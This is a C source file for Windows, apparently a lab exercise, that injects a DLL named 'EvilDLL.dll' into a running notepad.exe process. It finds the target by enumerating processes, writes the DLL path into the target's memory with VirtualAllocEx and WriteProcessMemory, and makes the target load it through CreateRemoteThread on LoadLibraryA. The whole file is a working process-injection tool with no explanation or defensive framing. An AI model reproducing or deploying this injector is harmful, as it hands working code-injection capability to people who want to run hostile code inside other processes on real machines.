#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

DWORD searching_seek_and_destroy(wchar_t* process_name) {

    HANDLE handleSnapshot;
    PROCESSENTRY32 process;
    int pid = 0;

    handleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (handleSnapshot == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    process.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(handleSnapshot, &process)) goto ExitAndCleanup;

    do {

        printf("process name : %ws\n", process.szExeFile);

        if (lstrcmpiW((LPCWSTR)process_name, process.szExeFile) == 0) {

            printf("\nWe found %ws !\n", process.szExeFile);
            pid = process.th32ProcessID;
            break;
        }
    } while (Process32Next(handleSnapshot, &process));

ExitAndCleanup:
    if (handleSnapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(handleSnapshot);
    }
    else {
        printf("Error while taking snapshot {X__x}\n");
    }

    return pid;
}

void injection_remote(char* payload, SIZE_T size, wchar_t* target_process) {

    HANDLE HandleThread = NULL;
    HANDLE handleProcess = NULL;
    LPVOID PointerToCode = NULL;
    LPVOID LoadLibraryAddr = NULL;
    int pid = 0;

    pid = searching_seek_and_destroy(target_process);

    if (pid == 0) goto ExitAndCleanup;

    LoadLibraryAddr = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");

    handleProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);

    if (handleProcess == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    PointerToCode = VirtualAllocEx(handleProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (PointerToCode == NULL) goto ExitAndCleanup;

    WriteProcessMemory((LPVOID)handleProcess, PointerToCode, payload, size, NULL);

    HandleThread = CreateRemoteThread(handleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryAddr, PointerToCode, 0, NULL);

    if (HandleThread == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    WaitForSingleObject(HandleThread, INFINITE);

ExitAndCleanup:
    if (pid == 0) {
        printf("Notepad note found  {X__x}\n");
        exit(1);
    }
    if (handleProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(handleProcess);
    }
    else {
        printf("Error while opening process {X__x}\n");
    }
    if (HandleThread != INVALID_HANDLE_VALUE) {
        CloseHandle(HandleThread);
    }
    else {
        printf("Error while opening thread {X__x}\n");
    }
    if (PointerToCode == NULL) {
        printf("Error while allocating memory {X__x}\n");
    }
}

void main(void) {

    char MyPayload[] = "C:\\Users\\IEUser\\Source\\Repos\\DLL_Injection\\x64\\Release\\EvilDLL.dll";
    SIZE_T SizePayload = sizeof(MyPayload);

    printf("Payload size is %d bytes\n", (int)SizePayload);

    injection_remote(MyPayload, SizePayload, L"notepad.exe");

}
